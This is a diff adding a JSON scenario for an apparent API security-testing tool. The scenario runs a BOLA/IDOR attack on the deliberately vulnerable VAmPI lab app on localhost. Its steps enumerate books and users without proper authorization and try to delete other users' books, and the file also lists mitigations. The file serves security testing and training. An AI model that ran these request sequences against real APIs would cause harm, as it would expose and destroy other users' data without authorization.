@@ -1,0 +1,168 @@
+{
+  "id": "vampi-bola-books-enumeration",
+  "name": "VAmPI - BOLA Books Database Enumeration",
+  "category": "API Security",
+  "difficulty": "Beginner",
+  "description": "Exploits BOLA/IDOR vulnerability in VAmPI books endpoint to enumerate and access all books without proper authorization",
+  "kind": "scenario",
+  "tags": [
+    "vampi",
+    "bola",
+    "idor",
+    "api",
+    "owasp-api-1",
+    "enumeration"
+  ],
+  "target": "http://localhost:5000",
+  "estimatedDuration": "2-4 minutes",
+  "documentation": "https://github.com/erev0s/VAmPI",
+  "prerequisites": [
+    "VAmPI running on localhost:5000",
+    "At least one user account created"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 60,
+      "description": "Discover book API endpoints"
+    },
+    {
+      "name": "weaponization",
+      "duration": 90,
+      "description": "Prepare book enumeration payloads"
+    },
+    {
+      "name": "delivery",
+      "duration": 120,
+      "description": "Execute BOLA attacks against books"
+    },
+    {
+      "name": "exploitation",
+      "duration": 180,
+      "description": "Extract sensitive book data"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "BOLA",
+      "severity": "High",
+      "owasp": "API1:2023 Broken Object Level Authorization"
+    },
+    {
+      "classification": "ExcessiveDataExposure",
+      "severity": "Medium",
+      "owasp": "API3:2023 Broken Object Property Level Authorization"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "Access to books without authentication",
+      "Ability to enumerate all books in database",
+      "Access to books belonging to other users",
+      "Possible deletion of other users' books"
+    ],
+    "indicators": [
+      "HTTP 200 responses for unauthorized book access",
+      "Full book details exposed without ownership verification",
+      "User information leaked through book endpoints",
+      "No rate limiting on enumeration attempts"
+    ]
+  },
+  "mitigations": [
+    "Implement authorization checks on all book endpoints",
+    "Verify user ownership before returning book data",
+    "Require authentication for book listing endpoints",
+    "Use UUIDs instead of predictable titles/IDs",
+    "Implement rate limiting to prevent enumeration",
+    "Return only minimal data - no excessive information disclosure"
+  ],
+  "steps": [
+    {
+      "id": "create-user",
+      "name": "Create test user for authentication",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "testuser",
+          "password": "testpass123",
+          "email": "test@example.com"
+        }
+      }
+    },
+    {
+      "id": "login",
+      "name": "Authenticate to get JWT token",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "testuser",
+          "password": "testpass123"
+        }
+      }
+    },
+    {
+      "id": "get-books-list",
+      "name": "Get list of all books (no auth required - information disclosure)",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/books/v1"
+      }
+    },
+    {
+      "id": "enumerate-book-by-title",
+      "name": "Attempt to access books by title enumeration (IDOR)",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/books/v1/${BOOK_TITLE}"
+      }
+    },
+    {
+      "id": "access-book-authenticated",
+      "name": "Access books with authentication (should verify ownership but doesn't)",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/books/v1/${BOOK_TITLE}",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "user-enumeration-via-books",
+      "name": "Enumerate users who created books",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/users/v1",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "delete-other-user-book",
+      "name": "Attempt to delete books belonging to other users",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "DELETE",
+        "url": "/books/v1/${BOOK_TITLE}",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    }
+  ]
+}
